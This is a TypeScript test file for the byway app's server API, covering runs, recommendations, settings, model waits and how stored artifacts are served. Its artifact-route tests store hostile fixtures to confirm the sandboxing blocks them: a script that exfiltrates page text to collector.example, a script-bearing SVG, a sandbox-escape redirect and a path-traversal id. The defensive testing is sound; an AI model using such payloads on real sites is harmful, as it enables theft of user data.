import { readFileSync, writeFileSync } from 'node:fs';
import path from 'node:path';
import { afterEach, describe, expect, it, vi } from 'vitest';
import { GatewayError, type CheckpointRecord, type GatewayErrorCode } from '@byway/contracts';
import { AdvisorError } from '@byway/advisor';
import { heldKeyError, waitedError } from '@byway/gateway';
import type { Services } from '../src/services/index.ts';
import {
  HttpError,
  addRef,
  checkLedger,
  spendAction,
  spendRecords,
  artifactResponse,
  composeIntake,
  controlRun,
  createIntake,
  currentRecommendation,
  questionCosts,
  recipeForRun,
  recommendIntake,
  resolveInRun,
  startRun,
  updateAnswerWait,
  updateRenderer,
  updateSettings,
  type Deps,
  composeCommand,
  recommendCommand,
  workspaceRemaining,
} from '../src/server/api.ts';
import { AnswerWaitPatch, RecommendInput } from '../src/server/schemas.ts';
import { getRunData } from '../src/server/run-data.ts';
import { FIRST_QUESTION } from './fixtures/runner.ts';
import { TINY_PNG_BASE64, testHost, type TestHost } from './fixtures/services.ts';

let current: TestHost | undefined;

afterEach(async () => {
  await current?.dispose();
  current = undefined;
});

/** The real store, gateway (mock provider), prompts and advisor on a temp data directory, with the fake Runner. */
async function deps(): Promise<Deps> {
  current = testHost();
  const { host } = current;
  const services: Services = host.services(true);
  const ws = await services.store.ensureDefaultWorkspace();
  return { services, workspaceId: ws.id, profileId: 'demo', heldKeyIn: host.heldKeyIn, questionEstimates: host.questionEstimates, pricesCheckedOn: host.pricesCheckedOn, modelWaits: host.modelWaits };
}

async function openQuestion(d: Deps, runId: string): Promise<CheckpointRecord> {
  const open = (await d.services.runner.view(runId)).checkpoints.find((c) => c.status === 'open');
  if (!open) throw new Error('no open question');
  return open;
}

describe('route handler logic', () => {
  it('takes a problem from Start to a recommendation, re-routes on a flipped answer, keeps it, and starts the run', async () => {
    const d = await deps();
    const { intakeId } = await createIntake(d, { text: 'A landing page for my pottery studio' });
    expect(await d.services.store.getIntake(intakeId)).toMatchObject({ workspaceId: d.workspaceId, problem: { text: 'A landing page for my pottery studio' } });
    const rec = await currentRecommendation(d, intakeId);
    expect(rec.recipeId).toBe('c1');

    const flipped = rec.answers.map((a) => (a.questionId === 'visual' ? { ...a, answer: false, setBy: 'user' as const } : a));
    const again = await recommendIntake(d, intakeId, flipped);
    expect(again.recipeId).not.toBe('c1');
    // Coming back to the screen shows the answers as you left them.
    expect((await currentRecommendation(d, intakeId)).recipeId).toBe(again.recipeId);
    expect((await d.services.store.getIntake(intakeId))?.answers?.find((a) => a.questionId === 'visual')).toMatchObject({ answer: false, setBy: 'user' });

    const { runId } = await startRun(d, { intakeId, recipeId: 'c1', budgetUsd: 3 });
    const data = await getRunData(d.services, runId);
    expect(data.view.run).toMatchObject({ recipeId: 'c1', budgetUsd: 3, intakeId, profileId: 'demo' });
  });

  it('checks a library recipe through the advisor', async () => {
    const d = await deps();
    const { intakeId } = await createIntake(d, { text: 'Tighten my quarterly memo', recipeId: 'c4' });
    expect(await d.services.store.getIntake(intakeId)).toBeDefined();
    await expect(createIntake(d, { text: 'x', recipeId: 'c99' })).rejects.toMatchObject({ status: 404 });
  });

  it('composes a recipe, keeps it on the intake and starts it as composed, presentable even after a restart', async () => {
    const d = await deps();
    const { intakeId } = await createIntake(d, { text: 'Tighten my quarterly memo' });
    const composed = await composeIntake(d, intakeId);
    expect(composed.label.scope).toBe('Composed');
    expect(composed.ok).toBe(true);
    expect(composed).not.toHaveProperty('recipe');
    const kept = (await d.services.store.getIntake(intakeId))?.composed;
    expect(kept?.recipe.kind).toBe('composed');
    const { runId } = await startRun(d, { intakeId, budgetUsd: 2 });
    const run = await d.services.store.getRun(runId);
    if (!run) throw new Error('run missing');
    expect(run.intakeId).toBe(intakeId);
    // The run finds its composed recipe through its intake, which the store keeps.
    const shown = await recipeForRun(d, run);
    expect(shown.presentation).toEqual(kept?.presentation);
    expect(shown.label?.scope).toBe('Composed');
    expect(Object.keys(shown.steps ?? {}).length).toBeGreaterThan(0);
    // Without its intake, no label is better than a made-up one.
    expect(await recipeForRun(d, { ...run, intakeId: 'gone' })).toEqual({});
  });

  it('presents library runs from the catalog with a computed label and a step index', async () => {
    const d = await deps();
    const { intakeId } = await createIntake(d, { text: 'A memo', recipeId: 'c4' });
    const { runId } = await startRun(d, { intakeId, recipeId: 'c4', budgetUsd: 2 });
    const run = await d.services.store.getRun(runId);
    if (!run) throw new Error('run missing');
    const shown = await recipeForRun(d, run);
    expect(shown.presentation?.name).toBe('Memo Polish');
    expect(shown.label?.verdict).toBe('Untested');
    const presented = shown.presentation?.stages.flatMap((s) => s.steps.flatMap((step) => step.stepIds)) ?? [];
    expect(presented.length).toBeGreaterThan(0);
    for (const id of presented) expect(shown.steps?.[id]?.label).toBeDefined();
  });

  // UX-4 remainder: "Run this step?" and "Is this ready?" said what each answer does, never what it costs.
  it("prices each question an optional or a person's loop asks, with the run's own profile, for the Run screen", async () => {
    const d = await deps();
    const { intakeId } = await createIntake(d, { text: 'A memo', recipeId: 'c4' });
    const { runId } = await startRun(d, { intakeId, recipeId: 'c4', budgetUsd: 2 });
    const run = await d.services.store.getRun(runId);
    if (!run) throw new Error('run missing');
    const { recipe } = await recipeForRun(d, run);
    const costs = questionCosts(d, run, recipe);
    // C4 asks three optional questions and has no loop a person ends; the demo profile prices them at nothing.
    expect(Object.keys(costs ?? {}).sort()).toEqual(['claim-log', 'framings-if-wanted', 'recipient-critic']);
    expect(costs?.['framings-if-wanted']).toEqual({ asks: 'optional', lowUsd: 0, highUsd: 0, calls: { low: 1, high: 1 } });
    // The claim log is your own sign-off: no AI call.
    expect(costs?.['claim-log']?.calls).toEqual({ low: 0, high: 0 });
    // Asked for the run's own profile, not the one this request's Settings name (services.test.ts has how it is priced).
    const asked = vi.fn(d.questionEstimates);
    questionCosts({ ...d, profileId: 'best', questionEstimates: asked }, { ...run, profileId: 'balanced' }, recipe);
    expect(asked).toHaveBeenCalledWith(recipe, 'balanced');
    // A run whose recipe is not known gets none.
    expect(questionCosts(d, run, undefined)).toBeNull();
  });

  it('refuses unknown intakes, a missing composed recipe, and budgets over what the workspace has left', async () => {
    const d = await deps();
    await expect(recommendIntake(d, '0b7f2f5e-3c1a-4d2e-9f00-5a3c2b1d4e6f')).rejects.toBeInstanceOf(HttpError);
    const { intakeId } = await createIntake(d, { text: 'A memo' });
    await expect(startRun(d, { intakeId, budgetUsd: 2 })).rejects.toMatchObject({ status: 400 });
    await expect(startRun(d, { intakeId, recipeId: 'c4', budgetUsd: 500 })).rejects.toThrow(/workspace budget/);
  });

  it('starts one run for a Start sent twice with the same run id; the id for another problem or recipe is a conflict (F03 P3)', async () => {
    const d = await deps();
    const { intakeId } = await createIntake(d, { text: 'A memo', recipeId: 'c4' });
    const runId = '5d6e7f80-91a2-4b3c-8d4e-5f6a7b8c9d0e';
    const first = await startRun(d, { intakeId, recipeId: 'c4', budgetUsd: 2, runId });
    expect(first).toEqual({ runId });
    // The answer was lost and the browser sends the same Start again.
    expect(await startRun(d, { intakeId, recipeId: 'c4', budgetUsd: 2, runId })).toEqual({ runId });
    expect((await d.services.store.listRuns(d.workspaceId)).filter((r) => r.id === runId)).toHaveLength(1);
    const { intakeId: other } = await createIntake(d, { text: 'Another memo', recipeId: 'c4' });
    await expect(startRun(d, { intakeId: other, recipeId: 'c4', budgetUsd: 2, runId })).rejects.toMatchObject({ status: 409, message: expect.stringMatching(/another problem/) });
    // The same Start id asking for another recipe is another start, whatever its id says (the screen mints a new id then).
    await expect(startRun(d, { intakeId, recipeId: 'c1', budgetUsd: 2, runId })).rejects.toMatchObject({ status: 409, message: expect.stringMatching(/another problem or recipe/) });
  });

  it('resolves a question only within its own run, and passes validation messages through', async () => {
    const d = await deps();
    const { intakeId } = await createIntake(d, { text: 'A landing page', recipeId: 'c1' });
    const { runId } = await startRun(d, { intakeId, recipeId: 'c1', budgetUsd: 5 });
    const cp = await openQuestion(d, runId);
    expect(cp.kind).toBe(FIRST_QUESTION.kind);
    await expect(resolveInRun(d, 'run-other', cp.id, { choice: ['seed'] })).rejects.toMatchObject({ status: 404 });
    await expect(resolveInRun(d, runId, cp.id, { choice: ['nope'] })).rejects.toMatchObject({ status: 400 });
    await resolveInRun(d, runId, cp.id, { choice: ['seed'] });
    const after = (await d.services.runner.view(runId)).checkpoints.find((c) => c.id === cp.id);
    expect(after?.status).toBe('resolved');
    await expect(resolveInRun(d, runId, cp.id, { choice: ['seed'] })).rejects.toMatchObject({ status: 409, message: 'That question has already been answered.' });
  });

  it('says a question was withdrawn, not answered, when its run ended while it was open (API-1)', async () => {
    const d = await deps();
    const { intakeId } = await createIntake(d, { text: 'A landing page', recipeId: 'c1' });
    const { runId } = await startRun(d, { intakeId, recipeId: 'c1', budgetUsd: 5 });
    const cp = await openQuestion(d, runId);
    await controlRun(d, runId, 'cancel');
    await d.services.store.withdrawCheckpoints(runId);
    await expect(resolveInRun(d, runId, cp.id, { choice: ['seed'] })).rejects.toMatchObject({
      status: 409,
      message: 'This question was withdrawn: its run was cancelled or failed.',
    });
  });

  it('pauses, resumes and cancels runs through the runner, and leaves ended runs alone', async () => {
    const d = await deps();
    const { intakeId } = await createIntake(d, { text: 'A memo', recipeId: 'c4' });
    const { runId } = await startRun(d, { intakeId, recipeId: 'c4', budgetUsd: 2 });
    await controlRun(d, runId, 'pause');
    expect((await d.services.store.getRun(runId))?.status).toBe('paused');
    await controlRun(d, runId, 'resume');
    expect((await d.services.store.getRun(runId))?.status).not.toBe('paused');
    await controlRun(d, runId, 'cancel');
    expect((await d.services.runner.view(runId)).run.status).toBe('cancelled');
    await expect(controlRun(d, runId, 'resume')).rejects.toMatchObject({ status: 409 });
    await expect(controlRun(d, 'run-missing', 'cancel')).rejects.toMatchObject({ status: 404 });
  });

  it('saves the profile, demo mode and technical names as Store preferences, and refuses unknown profiles', async () => {
    const d = await deps();
    const next = await updateSettings(d, { profileId: 'best', workspaceBudgetUsd: 50, showTechnicalNames: true });
    expect(next).toEqual({ profileId: 'best', demoMode: false, showTechnicalNames: true });
    expect(await d.services.store.getPreferences(d.workspaceId)).toEqual(next);
    expect((await d.services.store.getWorkspace(d.workspaceId))?.budgetUsd).toBe(50);
    await expect(updateSettings(d, { profileId: 'nope' })).rejects.toMatchObject({ status: 400 });
  });

  it("switches the page renderer's OS sandbox only as asked, and keeps it in the store for the engine (ADR-0105)", async () => {
    const d = await deps();
    expect(await d.services.store.getRendererSettings()).toEqual({ osSandbox: true });
    expect(await updateRenderer(d, { osSandbox: false })).toMatchObject({ osSandbox: false, changedAt: expect.any(String) });
    expect((await d.services.store.getRendererSettings()).osSandbox).toBe(false);
    // Saving the other settings leaves it as it is.
    await updateSettings(d, { showTechnicalNames: true });
    expect((await d.services.store.getRendererSettings()).osSandbox).toBe(false);
    expect(await updateRenderer(d, { osSandbox: true })).toMatchObject({ osSandbox: true });
  });

  // The waits design of 2026-10-22: the store takes any minutes some kind offers; the web checks each model's own set,
  // from the gateway's profiles (the owner's choices: text 15, 30, 45 or 60, images 5, 10, 15 or 20, video 30, 45, 60 or
  // 75).
  it('saves a model’s answer wait from the minutes its own kind offers, and refuses any other, or a model no profile uses', async () => {
    const d = await deps();
    const fal = 'fal-ai/kling-video/v3/pro/image-to-video';
    expect(await updateAnswerWait(d, { provider: 'anthropic', model: 'claude-opus-5-5', minutes: 60 })).toMatchObject({ provider: 'anthropic', model: 'claude-opus-5-5', minutes: 60 });
    expect(await updateAnswerWait(d, { provider: 'openai', model: 'gpt-image-2.5-flare', minutes: 5 })).toMatchObject({ minutes: 5 });
    expect(await updateAnswerWait(d, { provider: 'fal', model: fal, minutes: 75 })).toMatchObject({ minutes: 75 });
    // Each kind's set, not the union the store takes: a text model's 5, an image model's 30, a video model's 20.
    const refused = [
      [{ provider: 'anthropic', model: 'claude-opus-5-5', minutes: 5 }, 'claude-opus-5-5 can wait 15, 30, 45 or 60 minutes, not 5.'],
      [{ provider: 'google', model: 'gemini-nano-banana-2.1', minutes: 30 }, 'gemini-nano-banana-2.1 can wait 5, 10, 15 or 20 minutes, not 30.'],
      [{ provider: 'fal', model: fal, minutes: 20 }, `${fal} can wait 30, 45, 60 or 75 minutes, not 20.`],
      // The same model through another provider, a model no profile uses, and the demo's mock: no wait to choose. The
      // demo profile does use the mock's models, so they are refused for what they are (WEB-4), any name alike.
      [{ provider: 'openrouter', model: 'claude-opus-5-5', minutes: 30 }, 'No model profile uses claude-opus-5-5 from openrouter, so it has no wait to choose.'],
      [{ provider: 'google', model: 'gemini-9-ultra', minutes: 30 }, 'No model profile uses gemini-9-ultra from google, so it has no wait to choose.'],
      [{ provider: 'mock', model: 'mock-big', minutes: 15 }, 'mock-big is one of demo mode’s sample models, which answer at once, so it has no wait to choose.'],
      [{ provider: 'mock', model: 'mock-anything', minutes: 15 }, 'mock-anything is one of demo mode’s sample models, which answer at once, so it has no wait to choose.'],
    ] as const;
    for (const [input, message] of refused) await expect(updateAnswerWait(d, input)).rejects.toMatchObject({ status: 400, message });
    expect((await d.services.store.getAnswerWaits(d.workspaceId)).map((w) => `${w.provider}/${w.model}: ${w.minutes}`)).toEqual([
      'anthropic/claude-opus-5-5: 60',
      `fal/${fal}: 75`,
      'openai/gpt-image-2.5-flare: 5',
    ]);
    // The request's shape: a provider, a model and whole minutes, nothing more.
    expect(AnswerWaitPatch.safeParse({ provider: 'anthropic', model: 'claude-opus-5-5', minutes: 30 }).success).toBe(true);
    for (const bad of [{ provider: 'anthropic', model: 'claude-opus-5-5', minutes: 30.5 }, { provider: 'anthropic', model: 'claude-opus-5-5', minutes: 30, workspaceId: 'other' }, { provider: '', model: 'claude-opus-5-5', minutes: 30 }, { provider: 'anthropic', minutes: 30 }]) {
      expect(AnswerWaitPatch.safeParse(bad).success).toBe(false);
    }
  });

  it('lists every profile’s models for the waits, key or no key, once per provider and model, and none of the mock’s', async () => {
    const d = await deps();
    const models = d.modelWaits();
    expect(models).toHaveLength(14);
    expect(models.some((m) => m.provider === 'mock')).toBe(false);
    expect(new Set(models.map((m) => `${m.provider}/${m.model}`)).size).toBe(14);
    // The demo's gateway lists them too: the profiles are the gateway's own, whatever keys are set.
    expect(d.services.gateway.demo).toBe(true);
    const profiles = d.services.gateway.profileStatus().filter((s) => s.profile.id !== 'demo');
    for (const s of profiles) for (const tier of ['big', 'mid'] as const) expect(models).toContainEqual(expect.objectContaining({ ...s.profile.tiers[tier], kind: 'text' }));
  });
});

describe('examples you admire (ADR-0071)', () => {
  it('stores pasted text and images, and passes them to the run as inputs.refs', async () => {
    const d = await deps();
    const text = await addRef(d, { text: '  A memo I admire.  ' });
    expect(text.mediaType).toBe('text/markdown');
    expect(await d.services.store.artifacts.getText(text.artifactId)).toBe('A memo I admire.');
    const image = await addRef(d, { image: { mediaType: 'image/png', base64: TINY_PNG_BASE64 } });
    expect(image.mediaType).toBe('image/png');

    const { intakeId } = await createIntake(d, { text: 'A memo', recipeId: 'c4' });
    const start = vi.spyOn(d.services.runner, 'start');
    await startRun(d, { intakeId, recipeId: 'c4', budgetUsd: 2, refs: [text.artifactId, image.artifactId, text.artifactId] });
    expect(start.mock.calls[0]?.[0]).toMatchObject({ intakeId, inputs: { refs: [text.artifactId, image.artifactId] } });
  });

  it('refuses images that are not what they claim, examples that were never stored, and examples for a recipe without them', async () => {
    const d = await deps();
    const svg = Buffer.from('<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>').toString('base64');
    await expect(addRef(d, { image: { mediaType: 'image/png', base64: svg } })).rejects.toMatchObject({ status: 400 });
    await expect(addRef(d, { image: { mediaType: 'image/jpeg', base64: TINY_PNG_BASE64 } })).rejects.toMatchObject({ status: 400 });

    const { intakeId } = await createIntake(d, { text: 'A landing page', recipeId: 'c1' });
    const ref = await addRef(d, { text: 'A page I admire.' });
    await expect(startRun(d, { intakeId, recipeId: 'c1', budgetUsd: 2, refs: [ref.artifactId] })).rejects.toThrow(/does not use examples/);
    await expect(startRun(d, { intakeId, recipeId: 'c4', budgetUsd: 2, refs: [`sha256:${'0'.repeat(64)}`] })).rejects.toThrow(/not found/);
  });
});

describe('the artifact route', () => {
  it('serves stored artifacts with their headers, as downloads on request, and refuses bad ids', async () => {
    const d = await deps();
    const page = await d.services.store.artifacts.putText('<!doctype html><title>x</title>', 'text/html');
    const res = await artifactResponse(d.services, encodeURIComponent(page.id), new URL(`http://127.0.0.1:3000/artifacts/${page.id}`));
    expect(res.status).toBe(200);
    // Inert at its own address: opened directly, a page runs no scripts (F05).
    expect(res.headers.get('content-security-policy')).toMatch(/(^|; )sandbox$/);
    expect(await res.text()).toContain('<title>x</title>');

    // The CSP names the origin the browser used, even when the request URL was normalised to localhost.
    const viaLoopback = await artifactResponse(d.services, page.id, new URL(`http://localhost:3000/artifacts/${page.id}`), 'http://127.0.0.1:3000');
    expect(viaLoopback.headers.get('content-security-policy')).toContain('img-src http://127.0.0.1:3000/artifacts/');

    const dl = await artifactResponse(d.services, page.id, new URL(`http://127.0.0.1:3000/artifacts/${page.id}?download=1&name=My%20page`));
    expect(dl.headers.get('content-disposition')).toBe('attachment; filename="my-page.html"');

    expect((await artifactResponse(d.services, 'sha256:..%2F..%2Fsecrets', new URL('http://127.0.0.1:3000/x'))).status).toBe(400);
    expect((await artifactResponse(d.services, `sha256:${'0'.repeat(64)}`, new URL('http://127.0.0.1:3000/x'))).status).toBe(404);
  });

  it('runs a page’s scripts only for ?scripts=1 asked by a same-origin frame, never cached; every other request is inert (F05)', async () => {
    const d = await deps();
    const page = await d.services.store.artifacts.putText('<!doctype html><script>location.href="http://collector.example/?d="+document.body.innerText</script>', 'text/html');
    const at = (query: string, headers: Record<string, string>) =>
      artifactResponse(d.services, page.id, new URL(`http://127.0.0.1:3000/artifacts/${page.id}${query}`), 'http://127.0.0.1:3000', 'artifacts', new Headers(headers));
    const frame = { 'sec-fetch-dest': 'iframe', 'sec-fetch-site': 'same-origin' };

    const granted = await at('?scripts=1', frame);
    expect(granted.status).toBe(200);
    expect(granted.headers.get('content-security-policy')).toMatch(/(^|; )sandbox allow-scripts$/);
    expect(granted.headers.get('cache-control')).toBe('no-store');

    const inert: [string, Record<string, string>][] = [
      ['?scripts=1', { 'sec-fetch-dest': 'document', 'sec-fetch-site': 'same-origin' }],
      ['?scripts=1', { 'sec-fetch-dest': 'document', 'sec-fetch-site': 'none' }],
      ['?scripts=1', {}],
      ['?scripts=1', { 'sec-fetch-dest': 'iframe', 'sec-fetch-site': 'cross-site' }],
      ['', frame],
      ['?download=1&scripts=1', frame],
    ];
    for (const [query, headers] of inert) {
      const res = await at(query, headers);
      const csp = res.headers.get('content-security-policy') ?? '';
      expect(csp, `${query} ${JSON.stringify(headers)}`).toMatch(/(^|; )sandbox$/);
      expect(csp).not.toContain('allow-scripts');
    }
    // The default address never depends on request headers, so it keeps its long cache; an ask for scripts is never cached.
    expect((await at('', frame)).headers.get('cache-control')).toContain('immutable');
    expect((await at('?scripts=1', {})).headers.get('cache-control')).toBe('no-store');
    // The media route never serves a page, whatever is asked.
    expect((await artifactResponse(d.services, page.id, new URL(`http://127.0.0.1:3000/api/artifacts/${page.id}?scripts=1`), 'http://127.0.0.1:3000', 'media', new Headers(frame))).status).toBe(404);
  });

  it('serves only media at /api/artifacts, so a generated page cannot move itself to an address without its sandbox (SEC-1)', async () => {
    const d = await deps();
    const media = (id: string) => artifactResponse(d.services, id, new URL(`http://127.0.0.1:3000/api/artifacts/${id}`), 'http://127.0.0.1:3000', 'media');
    const page = await d.services.store.artifacts.putText('<!doctype html><script>location.replace("/api"+location.pathname)</script>', 'text/html');
    const pageRes = await media(page.id);
    expect(pageRes.status).toBe(404);
    expect(pageRes.headers.get('content-type')).not.toContain('text/html');

    // An SVG can carry script: it still loads in an <img>, but opening it downloads it instead of running it.
    const svg = await d.services.store.artifacts.putText('<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>', 'image/svg+xml');
    const svgRes = await media(svg.id);
    expect(svgRes.status).toBe(200);
    expect(svgRes.headers.get('content-disposition')).toMatch(/^attachment/);
    expect(svgRes.headers.get('content-security-policy')).toMatch(/sandbox(;|$)/);

    const png = await d.services.store.artifacts.put(Buffer.from(TINY_PNG_BASE64, 'base64'), 'image/png');
    const pngRes = await media(png.id);
    expect(pngRes.status).toBe(200);
    expect(pngRes.headers.get('content-type')).toBe('image/png');
    expect(pngRes.headers.get('content-disposition')).toBeNull();

    const text = await d.services.store.artifacts.putText('# Notes', 'text/markdown');
    expect((await media(text.id)).status).toBe(404);
  });
});

describe('model errors while recommending or composing (UX-2)', () => {
  const gatewayError = (code: GatewayErrorCode, scope?: 'workspace' | 'run') =>
    Object.assign(new GatewayError(code, `${code} from the provider`), scope ? { budget: { scope, capUsd: 5, spentUsd: 5, reservedUsd: 0, estimateUsd: 0.1, shortfallUsd: 0.1 } } : {});

  it('says what went wrong and what to do, with a status that matches', async () => {
    const d = await deps();
    const { intakeId } = await createIntake(d, { text: 'A memo' });
    const recommend = vi.spyOn(d.services.advisor, 'recommend');
    const cases: [Error, number, RegExp][] = [
      [gatewayError('no-credentials'), 400, /key/],
      [gatewayError('budget-exceeded', 'workspace'), 400, /workspace budget.*Settings/],
      [gatewayError('rate-limited'), 503, /busy/],
      [gatewayError('provider-error'), 503, /did not answer/],
      // ADR-0095: a line of the ledger the spend book cannot read pauses paid calls until the person acknowledges it.
      [gatewayError('accounting-fault'), 409, /cannot read.*Settings, Spending records/],
      // byway's own failures (follow-up (e)): a billed call it could not keep says it was paid for; a call it did not start says so.
      [new GatewayError('byway-failure', 'anthropic answered and billed this call (advisor.intake), but byway could not record its cost', false, { billed: true }), 500, /paid for.*Spending records.*pays for, a new call/],
      [new GatewayError('byway-failure', 'byway is stopping, so it did not start this call. Try again once it has started again.', true, { billed: false }), 503, /^byway is stopping, so it did not start this call/],
      [new AdvisorError('intake-unreadable', 'unreadable'), 502, /could not read/],
      // A held key (ADR-0088): the gateway's own message, which names the variable and says what to do.
      [heldKeyError('invalid-request', 'This request contains your ANTHROPIC_API_KEY. byway never sends a key to a model; remove it from the material and try again.', 'ANTHROPIC_API_KEY'), 400, /^This request contains your ANTHROPIC_API_KEY\. .*remove it/],
      [heldKeyError('provider-error', 'anthropic answered and billed this call (intake), but its answer contained your ANTHROPIC_API_KEY, so byway did not use it.', 'ANTHROPIC_API_KEY'), 502, /^anthropic answered and billed this call .*did not use it/],
    ];
    for (const [err, status, message] of cases) {
      recommend.mockRejectedValueOnce(err);
      await expect(recommendIntake(d, intakeId)).rejects.toMatchObject({ status, message: expect.stringMatching(message) });
    }
    const compose = vi.spyOn(d.services.advisor, 'compose');
    compose.mockRejectedValueOnce(new AdvisorError('compose-unreadable', 'unreadable'));
    await expect(composeIntake(d, intakeId)).rejects.toMatchObject({ status: 502, message: expect.stringMatching(/build a recipe/) });
    // A call that used the whole of its model's wait (CRITIC-1), while recommending or composing: the wait ran out, it
    // may have billed the work, where to wait longer, and that trying again is a new call.
    const waited = waitedError({ provider: 'google', model: 'gemini-3.1-pro-preview' }, { minutes: 15, how: 'answer' }, { retryable: false, billing: 'maybe' });
    const said = expect.stringMatching(/^Google’s model gemini-3\.1-pro-preview did not answer within 15 minutes, the wait chosen in Settings, so byway stopped waiting\. It may have billed the work\. To wait longer, change 'How long to wait for an answer' in Settings\. Trying again makes a new call, which may be billed too\.$/);
    recommend.mockRejectedValueOnce(waited);
    await expect(recommendIntake(d, intakeId)).rejects.toMatchObject({ status: 504, message: said });
    compose.mockRejectedValueOnce(waited);
    await expect(composeIntake(d, intakeId)).rejects.toMatchObject({ status: 504, message: said });
    // Anything else is not dressed up as a model problem.
    recommend.mockRejectedValueOnce(new TypeError('a bug'));
    await expect(recommendIntake(d, intakeId)).rejects.toBeInstanceOf(TypeError);
  });

  it("gives the Recommendation screen's first ask a problem to show in words, stores nothing, and the next ask tries again", async () => {
    const d = await deps();
    const { intakeId } = await createIntake(d, { text: 'A memo' });
    vi.spyOn(d.services.advisor, 'recommend').mockRejectedValueOnce(gatewayError('rate-limited'));
    await expect(recommendCommand(d, intakeId, { ensure: true })).rejects.toMatchObject({ message: expect.stringMatching(/busy/) });
    expect((await d.services.store.getIntake(intakeId))?.recommendation).toBeUndefined();
    const second = await recommendCommand(d, intakeId, { ensure: true });
    expect(second.recommendation.recipeId).toBeTruthy();
  });
});

describe('Recommendation screen commands return everything they change (F14, ADR-0082)', () => {
  const rateLimited = () => new GatewayError('rate-limited', 'rate-limited from the provider');

  it('Try again ({ ensure: true }) makes and stores the recommendation once, and says what is left in the workspace', async () => {
    const d = await deps();
    const { intakeId } = await createIntake(d, { text: 'A landing page for my pottery studio' });
    const recommend = vi.spyOn(d.services.advisor, 'recommend');
    recommend.mockRejectedValueOnce(rateLimited());
    await expect(recommendCommand(d, intakeId, { ensure: true })).rejects.toMatchObject({ message: expect.stringMatching(/busy/) });
    expect(recommend).toHaveBeenCalledTimes(1);

    const first = await recommendCommand(d, intakeId, { ensure: true });
    expect(first.recommendation.recipeId).toBe('c1');
    expect((await d.services.store.getIntake(intakeId))?.recommendation?.recipeId).toBe('c1');
    expect(first.remainingUsd).toBe((await workspaceRemaining(d)).remainingUsd);
    // Asking again returns the stored one: no second model call.
    const second = await recommendCommand(d, intakeId, { ensure: true });
    expect(second.recommendation).toEqual(first.recommendation);
    expect(recommend).toHaveBeenCalledTimes(2);
  });

  it('re-routing with flipped answers still works through the same command', async () => {
    const d = await deps();
    const { intakeId } = await createIntake(d, { text: 'A landing page for my pottery studio' });
    const { recommendation } = await recommendCommand(d, intakeId, { ensure: true });
    const answers = recommendation.answers.map((a) => (a.questionId === 'visual' ? { ...a, answer: false, setBy: 'user' as const } : a));
    const next = await recommendCommand(d, intakeId, { answers });
    expect(next.recommendation.recipeId).not.toBe('c1');
    expect(typeof next.remainingUsd).toBe('number');
  });

  it('Build my own during a failure asks the model for no recommendation, stores none, and says what is left', async () => {
    const d = await deps();
    const { intakeId } = await createIntake(d, { text: 'Tighten my quarterly memo' });
    const recommend = vi.spyOn(d.services.advisor, 'recommend');
    recommend.mockRejectedValueOnce(rateLimited());
    await expect(currentRecommendation(d, intakeId)).rejects.toBeInstanceOf(HttpError);
    const calls = recommend.mock.calls.length;
    const result = await composeCommand(d, intakeId);
    expect(result.composed.ok).toBe(true);
    expect(result.remainingUsd).toBe((await workspaceRemaining(d)).remainingUsd);
    expect(recommend.mock.calls.length).toBe(calls);
    expect((await d.services.store.getIntake(intakeId))?.recommendation).toBeUndefined();
  });

  it('reports the remaining amount as it is now, a raised cap included', async () => {
    const d = await deps();
    const before = await workspaceRemaining(d);
    await updateSettings(d, { workspaceBudgetUsd: before.capUsd + 30 });
    const after = await workspaceRemaining(d);
    expect(after.remainingUsd).toBeCloseTo(before.remainingUsd + 30, 2);
    expect(after.workspaceId).toBe(d.workspaceId);
  });

  it('accepts exactly two request bodies: { ensure: true } or { answers }; an empty body is still refused', () => {
    expect(RecommendInput.safeParse({ ensure: true }).success).toBe(true);
    expect(RecommendInput.safeParse({ answers: [] }).success).toBe(true);
    expect(RecommendInput.safeParse({}).success).toBe(false);
    expect(RecommendInput.safeParse({ ensure: false }).success).toBe(false);
    expect(RecommendInput.safeParse({ ensure: 'yes' }).success).toBe(false);
  });
});

describe('exports carry their images (EXP-1)', () => {
  it('inlines byway-served images into a downloaded page or Markdown file, so it works away from byway', async () => {
    const d = await deps();
    const png = await d.services.store.artifacts.put(Buffer.from(TINY_PNG_BASE64, 'base64'), 'image/png');
    const encoded = png.id.replace(':', '%3A');
    const md = await d.services.store.artifacts.putText(`# Cycling\n\n![A bike](/api/artifacts/${png.id})\n\n![Again](/artifacts/${encoded})\n`, 'text/markdown');
    const res = await artifactResponse(d.services, md.id, new URL(`http://127.0.0.1:3000/artifacts/${md.id}?download=1&name=Cycling`));
    const body = await res.text();
    expect(res.headers.get('content-disposition')).toBe('attachment; filename="cycling.md"');
    expect(body).not.toContain('/artifacts/');
    expect(body).toContain(`![A bike](data:image/png;base64,${TINY_PNG_BASE64})`);
    expect(body).toContain(`![Again](data:image/png;base64,${TINY_PNG_BASE64})`);

    const page = await d.services.store.artifacts.putText(`<!doctype html><img src="/api/artifacts/${png.id}" alt="x">`, 'text/html');
    const html = await (await artifactResponse(d.services, page.id, new URL(`http://127.0.0.1:3000/artifacts/${page.id}?download=1`))).text();
    expect(html).toBe(`<!doctype html><img src="data:image/png;base64,${TINY_PNG_BASE64}" alt="x">`);
    // Viewing (not downloading) serves the stored bytes as they are.
    expect(await (await artifactResponse(d.services, page.id, new URL(`http://127.0.0.1:3000/artifacts/${page.id}`))).text()).toContain('/api/artifacts/');
  });

  it('leaves a reference it cannot inline as it was (missing, or not an image or clip)', async () => {
    const d = await deps();
    const missing = `sha256:${'1'.repeat(64)}`;
    const note = await d.services.store.artifacts.putText('a note', 'text/markdown');
    const md = await d.services.store.artifacts.putText(`![gone](/api/artifacts/${missing}) [note](/artifacts/${note.id})`, 'text/markdown');
    const body = await (await artifactResponse(d.services, md.id, new URL(`http://127.0.0.1:3000/artifacts/${md.id}?download=1`))).text();
    expect(body).toBe(`![gone](/api/artifacts/${missing}) [note](/artifacts/${note.id})`);
  });
});

describe('Settings: checking the spend ledger on demand (ADR-0091)', () => {
  it('says the ledger checks out, then names the damage once a line is broken', async () => {
    const d = await deps();
    const { intakeId } = await createIntake(d, { text: 'A landing page for my pottery studio' });
    await currentRecommendation(d, intakeId);
    expect(await checkLedger(d)).toEqual({ intact: true, message: expect.stringMatching(/checks out/) });
    const file = path.join(current!.dataDir, 'ledger.jsonl');
    writeFileSync(file, `{not an entry\n${readFileSync(file, 'utf8')}`);
    expect(await checkLedger(d)).toEqual({ intact: false, message: expect.stringMatching(/^Line 1 of the spend ledger cannot be read/) });
  });
